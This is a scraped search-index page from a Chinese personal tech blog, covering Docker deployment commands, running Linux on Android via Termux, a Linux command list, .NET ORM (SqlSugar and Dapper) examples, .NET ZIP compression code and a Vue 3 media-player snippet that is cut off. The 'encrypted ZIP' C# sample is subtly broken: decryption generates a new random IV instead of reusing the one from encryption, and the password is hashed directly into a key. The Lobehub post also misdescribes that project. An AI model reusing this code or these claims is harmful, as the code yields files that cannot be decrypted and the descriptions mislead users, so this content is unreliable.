$PWD/ql/raw:/ql/raw \\ whyour/qinglong:latest dpanel 8807 lite 版 lite 版去掉了域名转发相关，需要自行转发域名绑定容器，不需要绑定 80 及 443 端口\ndocker run -d --name dpanel --restart=always \\ -p 8807:8080 -e APP_NAME=dpanel \\ -v /var/run/docker.sock:/var/run/docker.sock \\ -v /home/dpanel:/dpanel dpanel/dpanel:lite # or docker run -d --name dpanel --restart=always \\ -p 8807:8080 -e APP_NAME=dpanel \\ -v /var/run/docker.sock:/var/run/docker.sock -v dpanel:/dpanel \\ dpanel/dpanel:lite 标准版\ndocker run -d --name dpanel --restart=always \\ -p 80:80 -p 443:443 -p 8807:8080 -e APP_NAME=dpanel \\ -v /var/run/docker.sock:/var/run/docker.sock -v dpanel:/dpanel \\ dpanel/dpanel:latest it-tools 16080 docker run -d --name it-tools --restart unless-stopped -p 16080:80 corentinth/it-tools:latest x86_64 \u0026amp; ARM 架构 架构不兼容导致容器启动失败：\nWARNING: The requested image\u0026#39;s platform (linux/arm64/v8) does not match the detected host platform (linux/amd64/v3) 主机平台是 linux/amd64/v3（即 x86_64 架构），而镜像是为 linux/arm64/v8（即 ARM 架构）构建的，所以容器启动时失败了（退出码 255）。\n明确指定平台并启用 emulation（使用 \u0026ndash;platform 和 QEMU） 可以在运行容器时添加 \u0026ndash;platform linux/arm64 参数，Docker 会使用 QEMU 模拟 ARM 环境运行容器：\n安装 QEMU 支持\ndocker run --rm --privileged tonistiigi/binfmt --install all 然后就可以运行 ARM 镜像了。\ndocker run --rm --platform linux/arm64/v8 ideaflow1/xxx 前提：需要系统安装了 QEMU 模拟器，并启用了 binfmt。\n命令 ## cpu/内存 docker stats ## 磁盘使用 docker system df ## 清理不用的镜像 docker image prune -a -f ## 清理构建缓存 docker builder prune -a -f ## 清理悬挂的卷 docker volume prune -f ## 清理悬挂的网络 docker network prune -f 更换 Docker 镜像源 如果官方镜像源访问缓慢或无法访问，可以配置国内镜像源：\nsudo nano /etc/docker/daemon.json 添加国内镜像源（例如阿里云、网易等）：\n{ \u0026#34;registry-mirrors\u0026#34;: [ \u0026#34;https://mirror.ccs.tencentyun.com\u0026#34;, \u0026#34;https://docker.m.daocloud.io\u0026#34;, \u0026#34;https://docker.mirrors.ustc.edu.cn\u0026#34;, \u0026#34;https://hub-mirror.c.163.com\u0026#34; ] } 保存后重启 Docker：\nsudo systemctl daemon-reload sudo systemctl restart docker ","permalink":"https://qfsyso.github.io/posts/docker-pro/","summary":"docker 运行有趣的项目\nUptime Kuma 简单实用, 主要用来监控 Web 和网络 https://github.com/louislam/uptime-kuma\ndocker run -d --restart=always -p 3001:3001 -v uptime-kuma:/app/data --name uptime-kuma louislam/uptime-kuma:1 Portainer - 容器管理面板 Portainer 提供了一个简单易用的 Web 界面来管理和监控 Docker 容器、镜像、网络等。你可以通过下面的命令快速启动它：\ndocker volume create portainer_data docker run -d -p 9000:9000 --name=portainer --restart=always -v /var/run/docker.sock:/var/run/docker.sock -v portainer_data:/data portainer/portainer-ce lobechat \u0026lt;在Linux环境下，如何使用Docker部署Lobehub？\n在Linux环境下使用Docker部署Lobehub（一个开源的低代码开发平台）涉及几个步骤。 Lobehub 官方并未提供一个直接的Docker镜像，但你可以通过以下步骤来手动创建并运行一个Docker容器，以使用Lobehub。\n步骤 1: 安装Docker 确保你的Linux系统上已安装Docker。你可以通过运行以下命令来安装Docker：\n# 对于基于Debian的系统（如Ubuntu） sudo apt-get update sudo apt-get install docker.io # 对于基于RHEL的系统（如CentOS） sudo yum install docker # 启动Docker服务 sudo systemctl start docker sudo systemctl enable docker 步骤 2: 拉取Node.","title":"docker pro"},{"content":"在安卓中运行linux AnLinux-App https://github.com/EXALAB/AnLinux-App download anlinux\n安装完 选择安装的linux系统\n复制启动/安装命令\n安装termux（如果没装） https://github.com/termux/termux-app\n（安装好了之后，进入termux界面：\n执行termux-setup-storage 来申请一下内存卡权限\n然后同意就行了，之后执行以下命令：\npkg update \u0026amp;\u0026amp; pkg upgrade） 启动 粘贴运行命令\n安装完\n./start-debian.sh 启动 debian\n查IP su apt update apt install sudo sudo apt install net-tools ifconfig 修改密码 su # 输入当前 root 用户的密码 passwd # 输入新密码 Enter new UNIX password: # 再次输入新密码以确认 Retype new UNIX password: # 确认密码更改成功 passwd: password updated successfully exit linux 命令 1：文件管理 mv命令 – 移动或改名文件 ls命令 – 显示目录中文件及其属性信息 cp命令 – 复制文件或目录 mkdir命令 – 创建目录文件 pwd命令 – 显示当前工作目录的路径 tar命令 – 压缩和解压缩文件 cd命令 – 切换目录 chmod命令 – 改变文件或目录权限 2：文档编辑 cat命令 – 在终端设备上显示文件内容 grep命令 – 强大的文本搜索工具 rm命令 – 删除文件或目录 echo命令 – 输出字符串或提取后的变量值 tail命令 – 查看文件尾部内容 rmdir命令 – 删除空目录文件 sed命令 – 批量编辑文本文件 vi命令 – 文本编辑器 3：系统管理 find命令 – 根据路径和条件搜索指定文件 rpm命令 – RPM软件包管理器 ps命令 – 显示进程状态 startx命令 – 初始化X-window系统 uname命令 – 显示系统内核信息 kill命令 – 杀死进程 resize2fs命令 – 同步文件系统容量到内核 useradd命令 – 创建并设置用户信息 4：磁盘管理 df命令 – 显示磁盘空间使用量情况 fdisk命令 – 管理磁盘分区 lsblk命令 – 查看系统的磁盘使用情况 mkfs.ext4 命令 – 对磁盘设备进行EXT4格式化 vgextend命令 – 扩展卷组设备 hdparm命令 – 显示与设定硬盘参数 pvcreate命令 – 创建物理卷设备 lvcreate命令 – 创建逻辑卷设备 5：文件传输 tftp命令 – 上传及下载文件 curl命令 – 文件传输工具 fsck命令 – 检查与修复文件系统 rsync命令 – 远程数据同步工具 lprm命令 – 移除打印队列中的任务 ftpwho命令 – 显示FTP会话信息 ftp命令 – 文件传输协议客户端 lftp命令 – 优秀的命令行FTP客户端 6：网络通讯 ssh命令 – 安全的远程连接服务 netstat命令 – 显示网络状态 dhclient命令 – 动态获取或释放IP地址 ifconfig命令 – 显示或设置网络设备参数信息 ping命令 – 测试主机间网络连通性 sshd命令 – openssh服务器守护进程 smbpasswd命令 – 修改用户的SMB密码 iptables命令 – 防火墙策略管理工具 7：设备管理 mount命令 – 将文件系统挂载到目录 lspci命令 – 显示当前设备PCI总线设备信息 sensors命令 – 检测服务器硬件信息 rfkill命令 – 管理蓝牙和Wi-Fi设备 setleds命令 – 设置键盘的LED灯光状态 setpci命令 – 配置PCI硬件设备参数 hciconfig命令 – 配置蓝牙设备 lsusb命令 – 显示USB设备列表 8：备份压缩 zip命令 – 压缩文件 gzip命令 – 压缩和解压文件 unzip命令 – 解压缩zip格式文件 zipinfo命令 – 查看压缩文件信息 gunzip命令 – 解压提取文件内容 unarj命令 – 解压.arj文件 zipsplit命令 – 分割压缩包 dump命令 – 备份文件系统 9：其他命令 wget命令 – 下载网络文件 history命令 – 显示与管理历史命令记录 hash命令 – 管理命令运行时查询的哈希表 wait命令 – 等待指令执行完毕 bc命令 – 数字计算器 rmmod命令 – 移除内核模块 pigz命令 – 多线程的解压缩文件 xargs命令 – 给其他命令传参数的过滤器\nlinux命令 linux常用命令\n","permalink":"https://qfsyso.github.io/posts/android-run-linux/","summary":"在安卓中运行linux AnLinux-App https://github.com/EXALAB/AnLinux-App download anlinux\n安装完 选择安装的linux系统\n复制启动/安装命令\n安装termux（如果没装） https://github.com/termux/termux-app\n（安装好了之后，进入termux界面：\n执行termux-setup-storage 来申请一下内存卡权限\n然后同意就行了，之后执行以下命令：\npkg update \u0026amp;\u0026amp; pkg upgrade） 启动 粘贴运行命令\n安装完\n./start-debian.sh 启动 debian\n查IP su apt update apt install sudo sudo apt install net-tools ifconfig 修改密码 su # 输入当前 root 用户的密码 passwd # 输入新密码 Enter new UNIX password: # 再次输入新密码以确认 Retype new UNIX password: # 确认密码更改成功 passwd: password updated successfully exit linux 命令 1：文件管理 mv命令 – 移动或改名文件 ls命令 – 显示目录中文件及其属性信息 cp命令 – 复制文件或目录 mkdir命令 – 创建目录文件 pwd命令 – 显示当前工作目录的路径 tar命令 – 压缩和解压缩文件 cd命令 – 切换目录 chmod命令 – 改变文件或目录权限 2：文档编辑 cat命令 – 在终端设备上显示文件内容 grep命令 – 强大的文本搜索工具 rm命令 – 删除文件或目录 echo命令 – 输出字符串或提取后的变量值 tail命令 – 查看文件尾部内容 rmdir命令 – 删除空目录文件 sed命令 – 批量编辑文本文件 vi命令 – 文本编辑器 3：系统管理 find命令 – 根据路径和条件搜索指定文件 rpm命令 – RPM软件包管理器 ps命令 – 显示进程状态 startx命令 – 初始化X-window系统 uname命令 – 显示系统内核信息 kill命令 – 杀死进程 resize2fs命令 – 同步文件系统容量到内核 useradd命令 – 创建并设置用户信息 4：磁盘管理 df命令 – 显示磁盘空间使用量情况 fdisk命令 – 管理磁盘分区 lsblk命令 – 查看系统的磁盘使用情况 mkfs.","title":"android run linux"},{"content":"SqlSugar nuget 安装 SqlSugar\n安装 MySql.Data\n实体类\n[SugarTable(\u0026#34;IMMenu\u0026#34;)] class IMMenu { [SugarColumn(IsPrimaryKey = true, IsIdentity = true)] //id public int id { get; set; } public string name { get; set; } // 其他属性... public override string ToString() { return $\u0026#34;id: {id}, name: {name}\u0026#34;; } } 使用\n// 连接字符串 string connectionString = \u0026#34;server=xxx;user=root;password=xxx;database=DB\u0026#34;; // 创建SqlSugar客户端实例 SqlSugarClient db = new SqlSugarClient(new ConnectionConfig() { ConnectionString = connectionString, DbType = DbType.MySql, IsAutoCloseConnection = true, InitKeyType = InitKeyType.Attribute }); // 查询数据 var data = db.Queryable\u0026lt;IMMenu\u0026gt;().ToList(); // 输出结果 data.ForEach(item =\u0026gt; Console.WriteLine(item.ToString())); dapper public class IMMenu { public int id { get; set; } public string name { get; set; } } public class DapperExample { public static IEnumerable\u0026lt;IMMenu\u0026gt; GetAllIMMenus(string connectionString) { using (IDbConnection db = new MySqlConnection(connectionString)) { return db.Query\u0026lt;IMMenu\u0026gt;(\u0026#34;SELECT * FROM IMMenu\u0026#34;); } } } string connectionString = \u0026#34;server=xxx;user=root;password=xxx;database=DB\u0026#34;; IEnumerable\u0026lt;IMMenu\u0026gt; ms = DapperExample.GetAllIMMenus(connectionString); foreach (var m in ms) { Console.WriteLine($\u0026#34;Id: {m.id}, Name: {m.name}\u0026#34;); } 使用 Dapper 进行数据映射 Dapper 是一个轻量级的 ORM（对象关系映射）框架，它可以直接将查询结果映射到对象列表，性能非常高。 首先，你需要通过 NuGet 包管理器安装 Dapper 和 MySqlConnector（如果使用 MySQL 数据库）。\nusing Dapper; using MySqlConnector; using System.Collections.Generic; // 假设 IMMsgState 类的定义如下 public class IMMsgState { public int Id { get; set; } public string Message { get; set; } // 其他属性... } public class DatabaseHelper { public static List\u0026lt;IMMsgState\u0026gt; QueryIMMsgState(string connectionString, string sql) { using (var connection = new MySqlConnection(connectionString)) { return connection.Query\u0026lt;IMMsgState\u0026gt;(sql).AsList(); } } } string connectionString = \u0026#34;your_connection_string\u0026#34;; string sql = \u0026#34;SELECT * FROM your_table\u0026#34;; List\u0026lt;IMMsgState\u0026gt; result = DatabaseHelper.QueryIMMsgState(connectionString, sql); 分页查询 如果数据量非常大，可以考虑使用分页查询，每次只查询部分数据，减少单次查询的数据量。 sql \u0026ndash; MySQL 分页查询示例 SELECT * FROM your_table LIMIT @Offset, @Limit;\nint pageIndex = 1; int pageSize = 100; string sql = \u0026#34;SELECT * FROM your_table LIMIT @Offset, @Limit\u0026#34;; var parameters = new { Offset = (pageIndex - 1) * pageSize, Limit = pageSize }; using (var connection = new MySqlConnection(connectionString)) { var result = connection.Query\u0026lt;IMMsgState\u0026gt;(sql, parameters).AsList(); } 通过以上方法，可以显著提高处理大量数据时的性能。手动映射和使用 Dapper 都能避免 JSON 序列化和反序列化的开销，而分页查询则可以减少单次查询的数据量，降低内存压力。\n多表连接查询 当需要从多个表中获取数据时，可以使用 SQL 的连接操作，并通过 Dapper 将结果映射到自定义的对象或对象集合中。 示例代码 假设我们有两个表：Users 和 Orders，Users 表存储用户信息，Orders 表存储订单信息，并且通过 UserId 关联。\nusing Dapper; using MySqlConnector; using System; using System.Collections.Generic; using System.Data; // 用户类 public class User { public int Id { get; set; } public string Name { get; set; } public List\u0026lt;Order\u0026gt; Orders { get; set; } } // 订单类 public class Order { public int Id { get; set; } public string OrderNumber { get; set; } public int UserId { get; set; } } class Program { static void Main() { string connectionString = \u0026#34;your_connection_string\u0026#34;; using (IDbConnection db = new MySqlConnection(connectionString)) { string sql = @\u0026#34;SELECT u.Id, u.Name, o.Id as OrderId, o.OrderNumber, o.UserId FROM Users u LEFT JOIN Orders o ON u.Id = o.UserId\u0026#34;; var userDictionary = new Dictionary\u0026lt;int, User\u0026gt;(); var users = db.Query\u0026lt;User, Order, User\u0026gt;(sql, (user, order) =\u0026gt; { if (!userDictionary.TryGetValue(user.Id, out var currentUser)) { currentUser = user; currentUser.Orders = new List\u0026lt;Order\u0026gt;(); userDictionary.Add(currentUser.Id, currentUser); } if (order != null) { currentUser.Orders.Add(order); } return currentUser; }, splitOn: \u0026#34;OrderId\u0026#34;); var result = users.AsList(); foreach (var user in result) { Console.WriteLine($\u0026#34;User: {user.Name}, Orders Count: {user.Orders.Count}\u0026#34;); } } } } 解释 Query 方法的第一个泛型参数 User 表示第一个结果集映射的类型，第二个泛型参数 Order 表示第二个结果集映射的类型，最后一个泛型参数 User 表示最终返回的类型。 splitOn 参数指定了用于分割结果集的列名，这里是 OrderId。 通过 Dictionary 来避免重复创建 User 对象，将每个用户的订单信息添加到对应的 User 对象中。\n存储过程调用 Dapper 可以很方便地调用数据库中的存储过程。\nusing Dapper; using MySqlConnector; using System; using System.Data; // 存储过程返回的结果类 public class ProcedureResult { public int Id { get; set; } public string Name { get; set; } } class Program { static void Main() { string connectionString = \u0026#34;your_connection_string\u0026#34;; using (IDbConnection db = new MySqlConnection(connectionString)) { var parameters = new DynamicParameters(); parameters.Add(\u0026#34;@Param1\u0026#34;, \u0026#34;value1\u0026#34;); parameters.Add(\u0026#34;@Param2\u0026#34;, 123); var results = db.Query\u0026lt;ProcedureResult\u0026gt;(\u0026#34;YourStoredProcedureName\u0026#34;, parameters, commandType: CommandType.StoredProcedure); foreach (var result in results) { Console.WriteLine($\u0026#34;Id: {result.Id}, Name: {result.Name}\u0026#34;); } } } } 代码解释 使用 DynamicParameters 类来设置存储过程的输入参数。 commandType 参数指定为 CommandType.StoredProcedure，表示执行的是存储过程。\n批量插入和更新 当需要一次性插入或更新多条记录时，可以使用 Dapper 的批量操作来提高性能。 示例代码\nusing Dapper; using MySqlConnector; using System; using System.Collections.Generic; using System.Data; // 要插入的对象类 public class Product { public string Name { get; set; } public decimal Price { get; set; } } class Program { static void Main() { string connectionString = \u0026#34;your_connection_string\u0026#34;; using (IDbConnection db = new MySqlConnection(connectionString)) { var products = new List\u0026lt;Product\u0026gt; { new Product { Name = \u0026#34;Product 1\u0026#34;, Price = 10.99m }, new Product { Name = \u0026#34;Product 2\u0026#34;, Price = 20.99m }, new Product { Name = \u0026#34;Product 3\u0026#34;, Price = 30.99m } }; string insertSql = \u0026#34;INSERT INTO Products (Name, Price) VALUES (@Name, @Price)\u0026#34;; db.Execute(insertSql, products); } } } Execute 方法可以接受一个对象集合作为参数，Dapper 会自动将集合中的每个对象映射到 SQL 语句中的参数，并批量执行插入操作。\n事务处理 在处理复杂的数据库操作时，可能需要确保多个操作要么全部成功，要么全部失败，这时可以使用事务。\nusing Dapper; using MySqlConnector; using System; using System.Data; class Program { static void Main() { string connectionString = \u0026#34;your_connection_string\u0026#34;; using (IDbConnection db = new MySqlConnection(connectionString)) { db.Open(); using (IDbTransaction transaction = db.BeginTransaction()) { try { string sql1 = \u0026#34;UPDATE Table1 SET Column1 = \u0026#39;NewValue\u0026#39; WHERE Id = 1\u0026#34;; db.Execute(sql1, transaction: transaction); string sql2 = \u0026#34;INSERT INTO Table2 (Column2) VALUES (\u0026#39;Value\u0026#39;)\u0026#34;; db.Execute(sql2, transaction: transaction); transaction.Commit(); Console.WriteLine(\u0026#34;Transaction committed successfully.\u0026#34;); } catch (Exception ex) { transaction.Rollback(); Console.WriteLine($\u0026#34;Transaction rolled back due to error: {ex.Message}\u0026#34;); } } } } } EF/EF Core Entity Framework (EF) Core 是轻量化、可扩展、开源和跨平台版的常用 Entity Framework 数据访问技术，EF Core 是适用于 .NET 的现代对象数据库映射器。它支持 LINQ 查询、更改跟踪、更新和架构迁移。EF Core 通过提供程序插件 API 与 SQL Server、Azure SQL 数据库、SQLite、Azure Cosmos DB、MySQL、PostgreSQL 和其他数据库一起使用（微软官方出品）。\n官方文档教程：https://docs.microsoft.com/zh-cn/ef/ GitHub地址：https://github.com/dotnet/efcore\nDapper Dapper是一个简单的.NET对象映射器，在速度方面具有\u0026quot;King of Micro ORM\u0026quot;的头衔，几乎与使用原始的ADO.NET数据读取器一样快。ORM是一个对象关系映射器，它负责数据库和编程语言之间的映射。Dapper通过扩展IDbConnection提供一些有用的扩展方法去查询您的数据库。\n官方文档教程：https://www.learndapper.com/ GitHub地址：https://github.com/DapperLib/Dapper\nSqlSugar SqlSugar 是一款 老牌 .NET 开源多库架构ORM框架（EF Core单库架构），由果糖大数据科技团队 维护和更新 ，开箱即用最易上手的.NET ORM框架 。\n官网地址：http://www.donet5.com GitHub地址：https://github.com/donet5/SqlSugar\nFreeSql FreeSql 是一款功能强大的对象关系映射（O/RM）组件，支持 .NET Core 2.1+、.NET Framework 4.0+ 以及 Xamarin。\nGitHub地址：https://github.com/dotnetcore/FreeSql\nChloe.ORM Chloe.ORM 是一款国产十分稳定可靠的 ORM 框架。除了常规增删查改外还支持连接查询、分组查询、聚合查询、子查询，大部分操作可通过 lambda 完成。还支持分库分表分页、聚合、分组聚合，并支持多个字段组合分片以及多字段路由。\n文档地址：https ://github.com/shuxinqin/Chloe/wiki GitHub地址：https://github.com/shuxinqin/Chloe\nnhibernate-core NHibernate是.NET框架的成熟、开源的对象关系映射工具。它在积极开发中，功能齐全，并已成功应用于数千个项目中。\nNHibernate社区网站: https://nhibernate.info GitHub地址：https://github.com/nhibernate/nhibernate-core\nSmartSql SmartSql = C# 中的 MyBatis + .NET Core+ 缓存（内存 | Redis）+ R/W 拆分 + PropertyChangedTrack +动态存储库 + InvokeSync + 诊断。SmartSql 借鉴了 MyBatis 的思想，使用 XML 来管理 SQL ，并且提供了若干个筛选器标签来消除代码层面的各种 if/else 的判断分支。SmartSql将管理你的 SQL ，并且通过筛选标签来维护本来你在代码层面的各种条件判断，使你的代码更加优美。\n文档地址： https://smartsql.net/guide/ GitHub地址：https://github.com/dotnetcore/SmartSql\nPetaPoco PetaPoco 是一个用于 .NET（4、4.5+、net standard 2.0+）和 Mono 的微型、快速、易于使用的 micro-ORM。由于 PetaPoco 所代表的简单性和易用性，它受到许多人的喜爱。PetaPoco 是首选的微 ORM，也是任何体面的开发人员工具包中必不可少的实用程序。\n文档地址：https://discoverdot.net/projects/peta-poco GitHub地址：https://github.com/CollaboratingPlatypus/PetaPoco\nlinq2db LINQ to DB 是最快的LINQ数据库访问库，在POCO对象和数据库之间提供了一个简单、轻量、快速且类型安全的层。在架构上，它比 Dapper、Massive 或 PetaPoco 等微 ORM 高出一步，因为您使用 LINQ 表达式，而不是魔术字符串，同时在代码和数据库之间维护一个薄抽象层。您的查询由 C# 编译器检查并允许轻松重构。但是，它不像 LINQ to SQL 或实体框架那么重。没有更改跟踪，因此您必须自己进行管理，但从积极的方面来说，您可以获得更多控制权并更快地访问您的数据。\n文档地址：https://linq2db.github.io/ GitHub地址：https://github.com/linq2db/linq2db\nRepoDb RepoDB是一个开源的.NET ORM库，它弥合了微ORM和完整ORM之间的差距。它帮助您简化在开发过程中何时使用基本操作和高级操作的切换。\nGitHub地址：https://github.com/mikependon/RepoDB\nServiceStack.OrmLite OrmLite是一个快速、简单、类型化的.NET ORM，OrmLite 的目标是提供一个方便、DRY、无配置、与 RDBMS 无关的类型包装器，该包装器与 SQL 保持高度亲和性，公开直观的 API，生成可预测的 SQL 并干净地映射到断开连接和数据传输对象 (DTO) 友好、普通的旧C# 对象 (POCO)。这种方法更容易推理您的数据访问，从而清楚地知道什么 SQL 在什么时间执行，同时减轻意外行为、隐式 N+1 查询和重对象关系映射器 (ORM) 中普遍存在的泄漏数据访问。\n文档地址：https://docs.servicestack.net/ormlite/ GitHub地址：https://github.com/ServiceStack/ServiceStack.OrmLite\nSQLite-net 简单、强大、跨平台的 SQLite 客户端和 .NET 的 ORM。\nGitHub地址：https://github.com/praeclarum/sqlite-net\nInsight.Database Insight.Database是一个用于 .NET 的快速、轻量级的 micro-orm。\nGitHub地址：https://github.com/jonwagner/Insight.Database\ncyqdata cyq.data是一个高性能且功能最强大的orm（支持.NET Core），支持Txt、Xml、Access、Sqlite、Mssql、Mysql、Oracle、Sybase、Postgres、DB2、Redis、MemCache。\nGitHub地址：https://github.com/cyq1162/cyqdata\nquerybuilder SQL 查询构建器，用 c# 编写，帮助您轻松构建复杂的查询，支持 SqlServer、MySql、PostgreSql、Oracle、Sqlite 和 Firebird。\n官网地址：https://sqlkata.com/ GitHub地址：https://github.com/sqlkata/querybuilder\nTinyORM TinyORM是一个简单、快速且安全的微型.NET ORM。\nWiki地址：https://github.com/sdrapkin/SecurityDriven.TinyORM/wiki GitHub地址：https://github.com/sdrapkin/SecurityDriven.TinyORM\n","permalink":"https://qfsyso.github.io/posts/.net-orm/","summary":"SqlSugar nuget 安装 SqlSugar\n安装 MySql.Data\n实体类\n[SugarTable(\u0026#34;IMMenu\u0026#34;)] class IMMenu { [SugarColumn(IsPrimaryKey = true, IsIdentity = true)] //id public int id { get; set; } public string name { get; set; } // 其他属性... public override string ToString() { return $\u0026#34;id: {id}, name: {name}\u0026#34;; } } 使用\n// 连接字符串 string connectionString = \u0026#34;server=xxx;user=root;password=xxx;database=DB\u0026#34;; // 创建SqlSugar客户端实例 SqlSugarClient db = new SqlSugarClient(new ConnectionConfig() { ConnectionString = connectionString, DbType = DbType.MySql, IsAutoCloseConnection = true, InitKeyType = InitKeyType.","title":".net orm"},{"content":" 压缩一个目录为 ZIP 文件 using System; using System.IO.Compression; class Program { static void Main() { string startPath = @\u0026#34;c:\\example\\start\u0026#34;; // 要压缩的目录路径 string zipPath = @\u0026#34;c:\\example\\result.zip\u0026#34;; // 输出的 ZIP 文件路径 ZipFile.CreateFromDirectory(startPath, zipPath); Console.WriteLine(\u0026#34;压缩完成！\u0026#34;); } } 压缩单个文件到 ZIP 文件 using System; using System.IO; using System.IO.Compression; class Program { static void Main() { string filePath = @\u0026#34;c:\\example\\file.txt\u0026#34;; // 要压缩的文件路径 string zipPath = @\u0026#34;c:\\example\\result.zip\u0026#34;; // 输出的 ZIP 文件路径 using (FileStream fs = File.OpenRead(filePath)) using (FileStream zipFs = File.Create(zipPath)) using (ZipArchive archive = new ZipArchive(zipFs, ZipArchiveMode.Create)) { var fileEntry = archive.CreateEntry(Path.GetFileName(filePath)); using (Stream entryStream = fileEntry.Open()) { fs.CopyTo(entryStream); } } Console.WriteLine(\u0026#34;压缩完成！\u0026#34;); } } 解压 ZIP 文件 using System; using System.IO.Compression; class Program { static void Main() { string zipPath = @\u0026#34;c:\\example\\result.zip\u0026#34;; // 输入的 ZIP 文件路径 string extractPath = @\u0026#34;c:\\example\\extract\u0026#34;; // 解压的目标目录 ZipFile.ExtractToDirectory(zipPath, extractPath); Console.WriteLine(\u0026#34;解压完成！\u0026#34;); } } 加密压缩文件 using System; using System.IO; using System.IO.Compression; using System.Security.Cryptography; class Program { static void Main() { string sourceFile = @\u0026#34;c:\\example\\file.txt\u0026#34;; // 要压缩的文件路径 string zipPath = @\u0026#34;c:\\example\\encrypted.zip\u0026#34;; // 输出的 ZIP 文件路径 string password = \u0026#34;110110\u0026#34;; // 设置的密码 using (FileStream zipToOpen = new FileStream(zipPath, FileMode.Create)) using (ZipArchive archive = new ZipArchive(zipToOpen, ZipArchiveMode.Create, true)) { ZipArchiveEntry entry = archive.CreateEntry(Path.GetFileName(sourceFile)); using (Stream entryStream = entry.Open()) using (Aes aes = Aes.Create()) { aes.Key = GetKey(password); // 获取 AES 密钥 aes.IV = GetIV(); // 获取 AES 初始化向量 using (CryptoStream cryptoStream = new CryptoStream(entryStream, aes.CreateEncryptor(), CryptoStreamMode.Write)) using (FileStream fileToCompress = new FileStream(sourceFile, FileMode.Open)) { fileToCompress.CopyTo(cryptoStream); } } } Console.WriteLine(\u0026#34;加密压缩完成！\u0026#34;); } private static byte[] GetKey(string password) { using (SHA256 sha256 = SHA256.Create()) { return sha256.ComputeHash(System.Text.Encoding.UTF8.GetBytes(password)); } } private static byte[] GetIV() { byte[] iv = new byte[16]; // AES 需要 16 字节的 IV using (RandomNumberGenerator rng = RandomNumberGenerator.Create()) { rng.GetBytes(iv); } return iv; } } 解密解压文件 using System; using System.IO; using System.IO.Compression; using System.Security.Cryptography; class Program { static void Main() { string zipPath = @\u0026#34;c:\\example\\encrypted.zip\u0026#34;; // 输入的 ZIP 文件路径 string extractPath = @\u0026#34;c:\\example\\extract\u0026#34;; // 解压的目标目录 string password = \u0026#34;110110\u0026#34;; // 设置的密码 using (FileStream zipToOpen = new FileStream(zipPath, FileMode.Open)) using (ZipArchive archive = new ZipArchive(zipToOpen, ZipArchiveMode.Read)) { foreach (ZipArchiveEntry entry in archive.Entries) { string entryFilePath = Path.Combine(extractPath, entry.FullName); Directory.CreateDirectory(Path.GetDirectoryName(entryFilePath)); using (Stream entryStream = entry.Open()) using (Aes aes = Aes.Create()) { aes.Key = GetKey(password); // 获取 AES 密钥 aes.IV = GetIV(); // 获取 AES 初始化向量 using (CryptoStream cryptoStream = new CryptoStream(entryStream, aes.CreateDecryptor(), CryptoStreamMode.Read)) using (FileStream fileToExtract = new FileStream(entryFilePath, FileMode.Create)) { cryptoStream.CopyTo(fileToExtract); } } } } Console.WriteLine(\u0026#34;解密解压完成！\u0026#34;); } private static byte[] GetKey(string password) { using (SHA256 sha256 = SHA256.Create()) { return sha256.ComputeHash(System.Text.Encoding.UTF8.GetBytes(password)); } } private static byte[] GetIV() { byte[] iv = new byte[16]; // AES 需要 16 字节的 IV using (RandomNumberGenerator rng = RandomNumberGenerator.Create()) { rng.GetBytes(iv); } return iv; } } ","permalink":"https://qfsyso.github.io/posts/.net-zip/","summary":"压缩一个目录为 ZIP 文件 using System; using System.IO.Compression; class Program { static void Main() { string startPath = @\u0026#34;c:\\example\\start\u0026#34;; // 要压缩的目录路径 string zipPath = @\u0026#34;c:\\example\\result.zip\u0026#34;; // 输出的 ZIP 文件路径 ZipFile.CreateFromDirectory(startPath, zipPath); Console.WriteLine(\u0026#34;压缩完成！\u0026#34;); } } 压缩单个文件到 ZIP 文件 using System; using System.IO; using System.IO.Compression; class Program { static void Main() { string filePath = @\u0026#34;c:\\example\\file.txt\u0026#34;; // 要压缩的文件路径 string zipPath = @\u0026#34;c:\\example\\result.zip\u0026#34;; // 输出的 ZIP 文件路径 using (FileStream fs = File.OpenRead(filePath)) using (FileStream zipFs = File.","title":" .NET ZIP "},{"content":" vue3 play acc mp4 show png\n\u0026lt;template\u0026gt; \u0026lt;div v-if=\u0026#34;scope.row.MsgType == 7 || scope.row.MsgType == 19\u0026#34;\u0026gt; \u0026lt;el-button :type=\u0026#34;playingRowId === scope.row.AutoID ? \u0026#39;warning\u0026#39; : \u0026#39;info\u0026#39;\u0026#34; :disabled=\u0026#34;playingRowId === scope.row.AutoID\u0026#34; @click=\u0026#34;handleD(scope.row.Content, scope.row.MsgType, scope.row.UserID, scope.row.AutoID)\u0026#34; \u0026gt; {{ playingRowId === scope.row.AutoID ? \u0026#39;播放中\u0026#39; : \u0026#39;播放\u0026#39; }} \u0026lt;/el-button\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;!-- MP4 Dialog --\u0026gt; \u0026lt;el-dialog :visible.sync=\u0026#34;dialogVisible\u0026#34; width=\u0026#34;80%\u0026#34; center @close=\u0026#34;handleDialogClose\u0026#34;\u0026gt; \u0026lt;video ref=\u0026#34;videoPlayer\u0026#34; controls autoplay @ended=\u0026#34;handleDialogClose\u0026#34; :src=\u0026#34;mediaSource\u0026#34; style=\u0026#34;width: 100%;\u0026#34; \u0026gt;\u0026lt;/video\u0026gt; \u0026lt;/el-dialog\u0026gt; \u0026lt;/template\u0026gt; JS代码\n\u0026lt;script setup\u0026gt; import { ref } from \u0026#39;vue\u0026#39;; import { ElMessage } from \u0026#39;element-plus\u0026#39;; import request from \u0026#39;@/api/request\u0026#39;; // Assuming you use Axios or similar const playingRowId = ref(null); // Tracks the AutoID of the row currently being played const dialogVisible = ref(false); const mediaSource = ref(\u0026#39;\u0026#39;); async function handleD(com, msgt, userid, autoid) { try { // Set the current row\u0026#39;s AutoID as the playing row playingRowId.value = autoid; const response = await request({ url: \u0026#39;/adm/zuserApi/FdMsgJMCon\u0026#39;, method: \u0026#39;put\u0026#39;, data: { com, msgtype: String(msgt), userid: String(userid) // Use UserID for API request } }); const { isOk, msg } = response; if (isOk) { if (msg.endsWith(\u0026#39;.aac\u0026#39;)) { playAAC(msg, autoid); } else if (msg.endsWith(\u0026#39;.mp4\u0026#39;)) { playMP4(msg); } } else { ElMessage.error(\u0026#39;获取失败，请检查网络连接或联系管理员\u0026#39;); } } catch (error) { console.error(\u0026#39;获取时发生错误:\u0026#39;, error); ElMessage.error(\u0026#39;获取失败，请检查网络连接或联系管理员\u0026#39;); } } function playAAC(source, autoid) { const audio = new Audio(source); audio.play(); audio.onended = () =\u0026gt; { // Reset the playing row when playback finishes if (playingRowId.value === autoid) { playingRowId.value = null; } }; audio.onerror = () =\u0026gt; { if (playingRowId.value === autoid) { playingRowId.value = null; } 